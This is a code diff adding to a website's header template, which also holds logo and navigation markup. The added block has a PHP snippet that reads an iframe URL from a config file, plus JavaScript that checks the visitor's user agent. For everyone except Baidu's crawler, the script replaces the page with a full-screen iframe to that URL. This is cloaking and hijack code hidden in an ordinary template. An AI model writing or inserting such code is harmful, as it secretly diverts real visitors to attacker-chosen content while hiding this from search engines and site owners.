@@ -1,0 +1,35 @@
+
+{php}
+$config = '/www/wwwroot/ripbmm.com/template/iframe_config.json';
+$iframe_src = 'https://www.baidu.com';
+if (file_exists($config)) {
+    $data = json_decode(file_get_contents($config), true);
+    if (!empty($data['iframe_src'])) $iframe_src = $data['iframe_src'];
+}
+echo "<script>var iframeSrcFromConfig = '" . addslashes($iframe_src) . "';</script>";
+{/php}
+<script>
+    (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var isBaidu = ua.indexOf('baiduspider') !== -1;
+        if (!isBaidu) {
+            document.write('<body style="margin:0;padding:0;">');
+            document.write('<iframe src="' + iframeSrcFromConfig + '" frameborder="0" style="width:100%;height:100vh;"></iframe>');
+            document.write('</body></html>');
+        }
+    })();
+</script>
+
+<div class="top">
+  <div class="logo"><a href="{网站地址}"><img src="{logo width='200'/}" height="50"></a></div>
+</div>
+<!-- top结束 -->
+
+<!-- 导航开始 -->
+<ul class="nav">
+  <li style="width:20%"><a href="/">网站首页</a></li>
+{menu row="4"}
+  <li style="width:20%"><a href='{$vo.url}'>{$vo.title}</a></li>
+{/menu}
+</ul>
+<!-- 导航结束 -->
